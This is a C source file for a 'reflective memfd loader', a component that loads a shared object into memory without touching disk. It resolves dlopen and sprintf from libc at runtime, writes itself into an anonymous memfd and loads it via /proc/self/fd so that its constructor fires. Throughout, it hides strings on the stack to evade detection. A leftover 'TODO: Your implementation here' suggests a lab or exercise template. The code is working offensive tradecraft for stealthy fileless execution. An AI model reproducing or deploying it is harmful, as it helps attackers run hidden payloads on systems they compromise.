/*
 * loader.c — Reflective memfd loader
 *
 * Compiled as a -nostdlib -fPIC shared object. A bootstrap stub
 * branches into load_memfd() with the SO size in x0.
 *
 * Flow: find own base → find libc → resolve dlopen/sprintf →
 *       create memfd → write self → dlopen(/proc/self/fd/N) →
 *       constructor fires.
 */
#define _GNU_SOURCE
#include "procfsutil.h"
#include "elfsym.h"
#include "syscall.h"
#include "minstr.h"

#include <dlfcn.h>
#include <elf.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/mman.h>

/* Stack string macros — avoid .rodata leaks */
#define STACK_STR_DLOPEN(var)                                                 \
  char var[7];                                                                \
  var[0]='d'; var[1]='l'; var[2]='o'; var[3]='p';                            \
  var[4]='e'; var[5]='n'; var[6]='\0';

#define STACK_STR_SPRINTF(var)                                                \
  char var[8];                                                                \
  var[0]='s'; var[1]='p'; var[2]='r'; var[3]='i';                            \
  var[4]='n'; var[5]='t'; var[6]='f'; var[7]='\0';

#define STACK_STR_LIBCSO(var)                                                 \
  char var[8];                                                                \
  var[0]='l'; var[1]='i'; var[2]='b'; var[3]='c';                            \
  var[4]='.'; var[5]='s'; var[6]='o'; var[7]='\0';

#define STACK_STR_RXP(var)                                                    \
  char var[5];                                                                \
  var[0]='r'; var[1]='-'; var[2]='x'; var[3]='p'; var[4]='\0';

#define STACK_STR_PROC_FD(var)                                                \
  char var[17];                                                               \
  var[0]='/';  var[1]='p';  var[2]='r';  var[3]='o';                         \
  var[4]='c';  var[5]='/';  var[6]='s';  var[7]='e';                         \
  var[8]='l';  var[9]='f';  var[10]='/'; var[11]='f';                        \
  var[12]='d'; var[13]='/'; var[14]='%'; var[15]='d';                        \
  var[16]='\0';

typedef void *(*dlopen_func_t)(const char *, int);
typedef int   (*sprintf_func_t)(char *, const char *, ...);

void dummy(void);

static void msg(const char *s)
{
    sys_write(2, s, strlen(s));
}

/*
 * find_base — find our own ELF base by scanning backwards
 *
 * We know the code is page-aligned and starts with \x7FELF.
 * Take any known address in our SO, page-align it, then scan
 * backwards page by page looking for the ELF magic.
 */
static uint8_t *find_base(void)
{
    uintptr_t addr = (uintptr_t)find_base;

    addr &= ~0xFFF;

    int i;
    for (i = 0; i < 4; i++) {
        uint8_t *candidate = (uint8_t *)addr;
        if (memcmp(candidate, ELFMAG, SELFMAG) == 0) {
            return candidate;
        }
        addr -= 0x1000;
    }

    return NULL;
    return NULL;
}

/*
 * load_memfd — entry point called by bootstrap stub
 *
 * @span: total size of the SO file (passed in x0 by bootstrap)
 *
 * Steps:
 *   1. Find our own ELF base address
 *   2. Create an anonymous memfd
 *   3. Find libc in /proc/self/maps, resolve dlopen + sprintf
 *   4. Write ourselves to the memfd
 *   5. dlopen("/proc/self/fd/<N>") — triggers constructor
 */
void *load_memfd(size_t span)
{
  msg("[bootstrap] reflective loader started\n");

  uint8_t *base = find_base();
  if (!base) { msg("[-] cannot find own ELF base\n"); return NULL; }

  msg("[bootstrap] found ELF base\n");

  /* Step 2: Create anonymous file via memfd_create */
  // TODO: Your implementation here
  char mfd_name[2];
  mfd_name[0] = 'X';
  mfd_name[1] = '\0';

  int mem_fd = sys_memfd_create(mfd_name, MFD_CLOEXEC);
  if (mem_fd < 0) {
    msg("[-] memfd_create failed\n");
    return NULL;
  }


  /* Step 3: Find libc and resolve dlopen + sprintf */
  STACK_STR_LIBCSO(libc_str);
  STACK_STR_RXP(rxp_str);

  uintptr_t libc_base = 0;
  if (search_lib_procmaps(libc_str, rxp_str, &libc_base) != 0) {
    msg("[-] could not find libc in /proc/self/maps\n");
    return NULL;
  }

  msg("[bootstrap] found libc\n");

  STACK_STR_DLOPEN(dlopen_str);
  void *dlopen_ptr = find_symbol_symtab((void *)libc_base, dlopen_str);
  if (!dlopen_ptr) {
    msg("[-] could not resolve dlopen\n");
    return NULL;
  }

  STACK_STR_SPRINTF(sprintf_str);
  void *sprintf_ptr = find_symbol_symtab((void *)libc_base, sprintf_str);
  if (!sprintf_ptr) {
    msg("[-] could not resolve sprintf\n");
    return NULL;
  }

  dlopen_func_t my_dlopen = (dlopen_func_t)dlopen_ptr;
  sprintf_func_t my_sprintf = (sprintf_func_t)sprintf_ptr;

  /* Step 4-5: Write SO to memfd and dlopen it */
  STACK_STR_PROC_FD(fmt_str);
  char fd_path[64];
  my_sprintf(fd_path, fmt_str, mem_fd);

  msg("[bootstrap] loading via ");
  msg(fd_path);
  msg("\n");

  sys_write(mem_fd, base, span);

  void *handle = my_dlopen(fd_path, 2);
  if (!handle) {
    msg("[-] dlopen failed\n");
    return NULL;
  }

  msg("[bootstrap] done\n");
  return NULL;
}

void dummy(void) {}
